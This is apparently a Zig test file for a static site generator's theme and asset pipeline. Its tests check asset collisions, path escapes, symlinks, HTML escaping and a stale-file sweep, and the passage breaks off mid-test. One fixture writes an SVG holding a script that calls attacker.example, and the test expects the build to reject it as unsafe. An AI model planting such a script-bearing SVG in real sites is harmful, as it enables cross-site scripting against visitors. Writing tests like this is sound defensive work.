//! Tests moved verbatim from compile.zig's test region (22 tests).
//! Wiring: trailing import block in compile.zig (the `test-compile` root).

const std = @import("std");
const Io = std.Io;
const page_mod = @import("page.zig");
const parser = @import("parser.zig");
const render = @import("render.zig");
const assemble = @import("assemble.zig");
const scanner = @import("scanner.zig");
const identity = @import("identity.zig");
const cache = @import("cache.zig");
const dependency = @import("dependency.zig");
const target_mod = @import("target.zig");
const graph_mod = @import("graph.zig");
const diag = @import("diag.zig");
const html_nav = @import("html_nav.zig");
const html_relations = @import("html_relations.zig");
const html_toc = @import("html_toc.zig");
const html_body = @import("html_body.zig");
const include_mod = @import("include.zig");
const wikilink = @import("wikilink.zig");
const doclink = @import("doclink.zig");
const json_out = @import("json_out.zig");
const pipeline = @import("pipeline.zig");
const theme_mod = @import("theme.zig");
const layout_select = @import("layout_select.zig");
const textile = @import("textile.zig");
const cooklang_seam = @import("cooklang_seam.zig");
const content_asset = @import("content_asset.zig");
const source_io = @import("source_io.zig");
const source_provider = @import("source_provider.zig");
const artifact_sink = @import("artifact_sink.zig");
const search_index = @import("search_index.zig");
const site_url = @import("site_url.zig");
const github_pages = @import("github_pages.zig");
const sitemap = @import("sitemap.zig");
const standard_site = @import("standard_site.zig");
const standard_site_emit = @import("standard_site_emit.zig");
const nostr_emit = @import("nostr_emit.zig");
const link_audit = @import("link_audit.zig");
const publication_location = @import("publication_location.zig");
const artifact_inventory = @import("artifact_inventory.zig");
const publication_checks = @import("publication_checks.zig");
const publication_claims = @import("publication_claims.zig");
const publication_touches = @import("publication_touches.zig");
const publication_evidence_state = @import("publication_evidence_state.zig");
const publication_proof_pack = @import("publication_proof_pack.zig");
const timings = @import("timings.zig");
const compile_stage = @import("compile_stage.zig");
const compile_cache = @import("compile_cache.zig");
const compile_heading = @import("compile_heading.zig");

// Byte-identity aliases: bodies below call these bare, exactly as they
// did when they lived inside compile.zig.
const compile = @import("compile.zig");
const compileHtmlSite = compile.compileHtmlSite;
const experimental = compile.experimental;
const readFileAlloc = compile.readFileAlloc;

const kit = @import("compile_test_kit.zig");

const expectDirTreesEqual = kit.expectDirTreesEqual;
const writeTreeFile = kit.writeTreeFile;

test "F9.1 theme-site fixture: slots, page-relative asset URLs, footer" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/boris-f91-theme-site", .{tmp.sub_path});
    defer gpa.free(dist);

    const stats = try compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-site/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-site/experimental-theme/layouts/main.html",
        .quiet = true,
    });
    try std.testing.expectEqual(@as(usize, 5), stats.pages_written);

    // jobs > 1 path must produce the same acceptance surface
    const dist_jobs = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/boris-f91-theme-site-jobs", .{tmp.sub_path});
    defer gpa.free(dist_jobs);
    const stats_jobs = try compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-site/content",
        .dist_dir = dist_jobs,
        .layout_path = "docs/contracts/fixtures/theme-site/experimental-theme/layouts/main.html",
        .quiet = true,
        .jobs = 4,
    });
    try std.testing.expectEqual(@as(usize, 5), stats_jobs.pages_written);

    // index → assets/css/docs.css (same depth)
    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    const index_html = try readFileAlloc(io, cwd, index_path, gpa);
    defer gpa.free(index_html);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "href=\"assets/css/docs.css\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "page-metadata") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "site-footer__copy") != null);
    try std.testing.expect(std.mem.indexOf(u8, index_html, "Acme Platform") != null);

    // nested page → ../assets/css/docs.css
    const guide_path = try std.fmt.allocPrint(gpa, "{s}/guides/getting-started.html", .{dist});
    defer gpa.free(guide_path);
    const guide_html = try readFileAlloc(io, cwd, guide_path, gpa);
    defer gpa.free(guide_html);
    try std.testing.expect(std.mem.indexOf(u8, guide_html, "href=\"../assets/css/docs.css\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, guide_html, "Getting Started") != null);
    try std.testing.expect(std.mem.indexOf(u8, guide_html, "page-toc") != null);

    // Asset bytes identical to theme input
    const out_css = try std.fmt.allocPrint(gpa, "{s}/assets/css/docs.css", .{dist});
    defer gpa.free(out_css);
    const copied = try readFileAlloc(io, cwd, out_css, gpa);
    defer gpa.free(copied);
    const theme_css = try readFileAlloc(io, cwd, "docs/contracts/fixtures/theme-site/experimental-theme/assets/css/docs.css", gpa);
    defer gpa.free(theme_css);
    try std.testing.expectEqualStrings(theme_css, copied);
}

test "F9.1 asset collision with page output fails loudly" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/boris-f91-collision", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/assets/css/docs.md",
        \\---
        \\title: Collides
        \\---
        \\
        \\# Collides
        \\
    );
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/docs.css}}">{{content}}</html>
    );
    try writeTreeFile(io, work, "theme/assets/css/docs.css", "body{}");

    const layout_path = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout_path);
    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    // Page output is assets/css/docs.html — not css collision with .css.
    // Force collision: invent an asset path equal to page html output.
    // Entity id assets/css/docs → assets/css/docs.html. Place asset at that path.
    const theme_assets = try std.fmt.allocPrint(gpa, "{s}/theme/assets", .{work});
    defer gpa.free(theme_assets);
    try cwd.deleteTree(io, theme_assets);
    try writeTreeFile(io, work, "theme/assets/css/docs.html", "not-a-real-css");
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/docs.html}}">{{content}}</html>
    );

    try std.testing.expectError(error.AssetCollision, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout_path,
        .quiet = true,
    }));
}

test "F9.1 default managed Boris theme publishes its stylesheet" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/boris-f91-legacy", .{tmp.sub_path});
    defer gpa.free(dist);

    // Use real sample content + the product default managed theme.
    const stats = try compileHtmlSite(io, gpa, .{
        .content_root = "content",
        .dist_dir = dist,
        .layout_path = "themes/boris/layouts/main.html",
        .quiet = true,
    });
    try std.testing.expect(stats.pages_written > 0);

    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    const html = try readFileAlloc(io, cwd, index_path, gpa);
    defer gpa.free(html);
    try std.testing.expect(std.mem.indexOf(u8, html, "data-boris-search-root") != null);
    try std.testing.expect(std.mem.indexOf(u8, html, "skip-link") != null);
    try std.testing.expect(std.mem.indexOf(u8, html, "href=\"assets/css/boris.css\"") != null);
    const css_path = try std.fmt.allocPrint(gpa, "{s}/assets/css/boris.css", .{dist});
    defer gpa.free(css_path);
    const css = try readFileAlloc(io, cwd, css_path, gpa);
    defer gpa.free(css);
    try std.testing.expect(std.mem.indexOf(u8, css, ".site-sidebar") != null);
}

// ---------------------------------------------------------------------------
// F9.1 adversarial fixtures + determinism (theme path)
// ---------------------------------------------------------------------------

test "F9.1 adversarial: missing asset fails before publish" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/adv-missing", .{tmp.sub_path});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetNotFound, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/missing-asset/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/missing-asset/theme/layouts/main.html",
        .quiet = true,
    }));
}

test "F9.1 adversarial: asset-url without theme root fails" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/adv-no-theme", .{tmp.sub_path});
    defer gpa.free(dist);

    // Bare `layouts/…` is the only path form with null theme root (contract).
    // Write a temporary layout under repo `layouts/` and remove it after.
    const layout_path = "layouts/.boris-f91-theme-root-missing.html";
    try cwd.createDirPath(io, "layouts");
    try cwd.writeFile(io, .{
        .sub_path = layout_path,
        .data = "<html><link href=\"{{asset-url assets/css/docs.css}}\">{{content}}</html>",
    });
    defer cwd.deleteFile(io, layout_path) catch {};

    try std.testing.expectEqual(@as(?[]const u8, null), theme_mod.themeRootFromLayoutPath(layout_path));
    try std.testing.expectError(error.ThemeRootMissing, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/theme-root-missing/content",
        .dist_dir = dist,
        .layout_path = layout_path,
        .quiet = true,
    }));

    // Nested `…/layouts/…` derives a theme root; empty assets → AssetNotFound (not ThemeRootMissing).
    try std.testing.expectError(error.AssetNotFound, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/theme-root-missing/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/theme-root-missing/layouts/main.html",
        .quiet = true,
    }));
}

test "F9.1 adversarial: unsafe asset-url layouts fail at load" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/adv-unsafe", .{tmp.sub_path});
    defer gpa.free(dist);

    const cases = [_][]const u8{
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-escape-dotdot/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-absolute/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-backslash/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-no-assets-prefix/layouts/main.html",
    };
    for (cases) |lp| {
        try std.testing.expectError(error.LayoutInvalidAssetUrl, compileHtmlSite(io, gpa, .{
            .content_root = "docs/contracts/fixtures/theme-adversarial/unsafe-layout/content",
            .dist_dir = dist,
            .layout_path = lp,
            .quiet = true,
        }));
        // No published tree
        const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
        defer gpa.free(index_path);
        try std.testing.expectError(error.FileNotFound, cwd.access(io, index_path, .{}));
    }
}

test "F9.1 adversarial: metadata and title HTML-escape hostile frontmatter" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/adv-meta-esc", .{tmp.sub_path});
    defer gpa.free(dist);

    _ = try compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/metadata-escape/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/metadata-escape/theme/layouts/main.html",
        .quiet = true,
    });

    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    const html = try readFileAlloc(io, cwd, index_path, gpa);
    defer gpa.free(html);

    // Escaped in title and metadata sinks
    try std.testing.expect(std.mem.indexOf(u8, html, "&lt;b&gt;") != null);
    try std.testing.expect(std.mem.indexOf(u8, html, "&amp;") != null);
    try std.testing.expect(std.mem.indexOf(u8, html, "x&lt;script&gt;") != null);
    // Must not emit raw markup from title/tags into chrome sinks
    try std.testing.expect(std.mem.indexOf(u8, html, "<title>A <b>Bold</b>") == null);
    try std.testing.expect(std.mem.indexOf(u8, html, "x<script>") == null);
}

test "F9.1 adversarial: fixture collision tree fails" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/adv-coll", .{tmp.sub_path});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetCollision, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/collision/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/collision/theme/layouts/main.html",
        .quiet = true,
    }));
}

test "F9.1 determinism: theme-site full vs incremental and jobs byte-identical" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const base = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f91-det", .{tmp.sub_path});
    defer gpa.free(base);

    const content = "docs/contracts/fixtures/theme-site/content";
    const layout = "docs/contracts/fixtures/theme-site/experimental-theme/layouts/main.html";

    const full_a = try std.fmt.allocPrint(gpa, "{s}/full-a", .{base});
    defer gpa.free(full_a);
    const full_b = try std.fmt.allocPrint(gpa, "{s}/full-b", .{base});
    defer gpa.free(full_b);
    const jobs = try std.fmt.allocPrint(gpa, "{s}/jobs", .{base});
    defer gpa.free(jobs);
    const inc = try std.fmt.allocPrint(gpa, "{s}/inc", .{base});
    defer gpa.free(inc);

    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = full_a, .layout_path = layout, .quiet = true, .jobs = 1 });
    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = full_b, .layout_path = layout, .quiet = true, .jobs = 1 });
    try expectDirTreesEqual(io, gpa, full_a, full_b);

    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = jobs, .layout_path = layout, .quiet = true, .jobs = 4 });
    try expectDirTreesEqual(io, gpa, full_a, jobs);

    // Seed with incremental=true so the cache manifest is written; then no-op.
    // (Non-incremental builds do not write `.boris-cache/manifest.json`.)
    _ = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = inc, .layout_path = layout, .quiet = true, .incremental = true });
    const stats_noop = try compileHtmlSite(io, gpa, .{ .content_root = content, .dist_dir = inc, .layout_path = layout, .quiet = true, .incremental = true });
    try std.testing.expectEqual(@as(usize, 0), stats_noop.pages_written);
    // Compare HTML + assets (manifest may differ only if present under .boris-cache — exclude via selective check)
    const pages = [_][]const u8{
        "index.html",
        "guides.html",
        "guides/getting-started.html",
        "reference.html",
        "reference/configuration.html",
        "assets/css/docs.css",
    };
    const cwd = Io.Dir.cwd();
    for (pages) |rel| {
        const pa = try std.fmt.allocPrint(gpa, "{s}/{s}", .{ full_a, rel });
        defer gpa.free(pa);
        const pb = try std.fmt.allocPrint(gpa, "{s}/{s}", .{ inc, rel });
        defer gpa.free(pb);
        const a = try readFileAlloc(io, cwd, pa, gpa);
        defer gpa.free(a);
        const b = try readFileAlloc(io, cwd, pb, gpa);
        defer gpa.free(b);
        try std.testing.expectEqualSlices(u8, a, b);
    }
}

test "F9.2 non-incremental stale-HTML sweep preserves theme-owned .html assets" {
    // #61: full (non-incremental) stale cleanup walks dist/**/*.html and deletes
    // anything not in the live page set. Theme assets like assets/embed.html are
    // published into dist/ by copyAssetsToOutput and must survive that prune.
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f92-stale-html-theme-asset", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: Home
        \\---
        \\
        \\# Home
        \\
    );
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><a href="{{asset-url assets/embed.html}}">{{content}}</a></html>
    );
    try writeTreeFile(io, work, "theme/assets/embed.html", "<div id=\"embed\">ok</div>\n");
    try writeTreeFile(io, work, "theme/assets/css/a.css", "body{}\n");

    const layout = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout);
    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    // Explicit non-incremental full build (the buggy path).
    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
        .incremental = false,
    });

    const embed_path = try std.fmt.allocPrint(gpa, "{s}/assets/embed.html", .{dist});
    defer gpa.free(embed_path);
    const embed = try readFileAlloc(io, cwd, embed_path, gpa);
    defer gpa.free(embed);
    try std.testing.expectEqualStrings("<div id=\"embed\">ok</div>\n", embed);

    // Page output still published; theme asset is not mistaken for a page.
    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    try cwd.access(io, index_path, .{});

    // Second full build must keep the theme .html asset (re-publish + sweep).
    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
        .incremental = false,
    });
    const embed2 = try readFileAlloc(io, cwd, embed_path, gpa);
    defer gpa.free(embed2);
    try std.testing.expectEqualStrings("<div id=\"embed\">ok</div>\n", embed2);

    // True stale page html still gets pruned.
    const stale_path = try std.fmt.allocPrint(gpa, "{s}/gone.html", .{dist});
    defer gpa.free(stale_path);
    try writeTreeFile(io, dist, "gone.html", "<html>stale</html>\n");
    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
        .incremental = false,
    });
    try std.testing.expectError(error.FileNotFound, cwd.access(io, stale_path, .{}));
    // Theme asset still present after pruning a real stale page.
    const embed3 = try readFileAlloc(io, cwd, embed_path, gpa);
    defer gpa.free(embed3);
    try std.testing.expectEqualStrings("<div id=\"embed\">ok</div>\n", embed3);
}

test "F9.2 orphan theme assets scrubbed on remove and rename" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f92-orphan-assets", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: Home
        \\---
        \\
        \\# Home
        \\
    );
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/a.css}}">{{content}}</html>
    );
    try writeTreeFile(io, work, "theme/assets/css/a.css", "aaa");
    try writeTreeFile(io, work, "theme/assets/css/extra.css", "extra");

    const layout = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout);
    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    });

    const extra_path = try std.fmt.allocPrint(gpa, "{s}/assets/css/extra.css", .{dist});
    defer gpa.free(extra_path);
    try cwd.access(io, extra_path, .{});

    // Remove unreferenced extra.css from theme → orphan scrub on next build.
    const extra_theme = try std.fmt.allocPrint(gpa, "{s}/theme/assets/css/extra.css", .{work});
    defer gpa.free(extra_theme);
    try cwd.deleteFile(io, extra_theme);
    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
        .incremental = true,
    });
    try std.testing.expectError(error.FileNotFound, cwd.access(io, extra_path, .{}));

    // Rename a.css → b.css and update layout reference.
    const a_theme = try std.fmt.allocPrint(gpa, "{s}/theme/assets/css/a.css", .{work});
    defer gpa.free(a_theme);
    try cwd.deleteFile(io, a_theme);
    try writeTreeFile(io, work, "theme/assets/css/b.css", "bbb");
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/b.css}}">{{content}}</html>
    );
    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
        .incremental = true,
    });
    const a_out = try std.fmt.allocPrint(gpa, "{s}/assets/css/a.css", .{dist});
    defer gpa.free(a_out);
    const b_out = try std.fmt.allocPrint(gpa, "{s}/assets/css/b.css", .{dist});
    defer gpa.free(b_out);
    try std.testing.expectError(error.FileNotFound, cwd.access(io, a_out, .{}));
    const b_bytes = try readFileAlloc(io, cwd, b_out, gpa);
    defer gpa.free(b_bytes);
    try std.testing.expectEqualStrings("bbb", b_bytes);

    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    const html = try readFileAlloc(io, cwd, index_path, gpa);
    defer gpa.free(html);
    try std.testing.expect(std.mem.indexOf(u8, html, "assets/css/b.css") != null);
    try std.testing.expect(std.mem.indexOf(u8, html, "assets/css/a.css") == null);
}

test "F9.2 layout invalid UTF-8 fails at load boundary" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f92-layout-utf8", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: Home
        \\---
        \\
        \\# Home
        \\
    );
    // Invalid UTF-8 (truncated C3 sequence) with otherwise valid markers.
    const bad_layout = [_]u8{
        '<', 'h', 't', 'm', 'l', '>', 0xC3, 0x28, '{', '{', 'c', 'o', 'n', 't', 'e', 'n', 't', '}', '}', '<', '/', 'h', 't', 'm', 'l', '>',
    };
    const layouts_dir = try std.fmt.allocPrint(gpa, "{s}/theme/layouts", .{work});
    defer gpa.free(layouts_dir);
    try cwd.createDirPath(io, layouts_dir);
    const layout_path = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout_path);
    try cwd.writeFile(io, .{ .sub_path = layout_path, .data = &bad_layout });

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try std.testing.expectError(error.LayoutInvalidUtf8, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout_path,
        .quiet = true,
    }));
    const index_path = try std.fmt.allocPrint(gpa, "{s}/index.html", .{dist});
    defer gpa.free(index_path);
    try std.testing.expectError(error.FileNotFound, cwd.access(io, index_path, .{}));
}

test "F9.2 adversarial: invalid asset path grammar fails closed" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const dist = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f92-bad-paths", .{tmp.sub_path});
    defer gpa.free(dist);

    // Traversal / absolute / backslash / missing assets/ prefix (fixture layouts).
    const cases = [_][]const u8{
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-escape-dotdot/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-absolute/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-backslash/layouts/main.html",
        "docs/contracts/fixtures/theme-adversarial/unsafe-layout/theme-no-assets-prefix/layouts/main.html",
    };
    for (cases) |lp| {
        try std.testing.expectError(error.LayoutInvalidAssetUrl, compileHtmlSite(io, gpa, .{
            .content_root = "docs/contracts/fixtures/theme-adversarial/unsafe-layout/content",
            .dist_dir = dist,
            .layout_path = lp,
            .quiet = true,
        }));
    }

    // Collision fixture
    try std.testing.expectError(error.AssetCollision, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/collision/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/collision/theme/layouts/main.html",
        .quiet = true,
    }));

    // Missing referenced asset
    try std.testing.expectError(error.AssetNotFound, compileHtmlSite(io, gpa, .{
        .content_root = "docs/contracts/fixtures/theme-adversarial/missing-asset/content",
        .dist_dir = dist,
        .layout_path = "docs/contracts/fixtures/theme-adversarial/missing-asset/theme/layouts/main.html",
        .quiet = true,
    }));
}

test "F9.2 theme asset symlink rejected when host allows" {
    if (@import("builtin").os.tag == .windows) return;

    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/f92-theme-symlink", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: Home
        \\---
        \\
        \\# Home
        \\
    );
    try writeTreeFile(io, work, "theme/layouts/main.html",
        \\<html><link href="{{asset-url assets/css/docs.css}}">{{content}}</html>
    );
    try writeTreeFile(io, work, "theme/assets/css/real.css", "body{}");

    const css_dir = try std.fmt.allocPrint(gpa, "{s}/theme/assets/css", .{work});
    defer gpa.free(css_dir);
    var css = try cwd.openDir(io, css_dir, .{});
    defer css.close(io);
    css.symLink(io, "real.css", "docs.css", .{}) catch |err| switch (err) {
        error.AccessDenied, error.PermissionDenied => return,
        else => return err,
    };

    const layout = try std.fmt.allocPrint(gpa, "{s}/theme/layouts/main.html", .{work});
    defer gpa.free(layout);
    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetSymlink, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));
}

test "content-local assets: happy path rewrite and copy" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-happy2", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/guides/intro.md",
        \\---
        \\title: Intro
        \\---
        \\
        \\# Intro
        \\
        \\![diagram](intro.assets/diagram.svg)
        \\
    );
    try writeTreeFile(io, work, "content/guides/intro.assets/diagram.svg", "<svg id=\"v1\"/>");
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    _ = try compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    });

    const html_path = try std.fmt.allocPrint(gpa, "{s}/guides/intro.html", .{dist});
    defer gpa.free(html_path);
    const html = try readFileAlloc(io, cwd, html_path, gpa);
    defer gpa.free(html);
    try std.testing.expect(std.mem.indexOf(u8, html, "intro.assets/diagram.svg") != null);

    const asset_path = try std.fmt.allocPrint(gpa, "{s}/guides/intro.assets/diagram.svg", .{dist});
    defer gpa.free(asset_path);
    const asset = try readFileAlloc(io, cwd, asset_path, gpa);
    defer gpa.free(asset);
    try std.testing.expectEqualStrings("<svg id=\"v1\"/>", asset);
}

test "content-local assets: active SVG fails before HTML publish" {
    const gpa = std.testing.allocator;
    const io = std.testing.io;
    const cwd = Io.Dir.cwd();
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-active-svg", .{tmp.sub_path});
    defer gpa.free(work);
    try cwd.createDirPath(io, work);

    try writeTreeFile(io, work, "content/index.md",
        \\---
        \\title: Home
        \\---
        \\
        \\![logo](index.assets/logo.svg)
        \\
    );
    try writeTreeFile(io, work, "content/index.assets/logo.svg", "<svg><script>fetch('https://attacker.example')</script></svg>");
    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");

    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
    defer gpa.free(content);
    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
    defer gpa.free(layout);
    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
    defer gpa.free(dist);

    try std.testing.expectError(error.AssetUnsafeSvg, compileHtmlSite(io, gpa, .{
        .content_root = content,
        .dist_dir = dist,
        .layout_path = layout,
        .quiet = true,
    }));
    const stage = try std.fmt.allocPrint(gpa, "{s}.boris-stage", .{dist});
    defer gpa.free(stage);
    try std.testing.expectError(error.FileNotFound, cwd.access(io, dist, .{}));
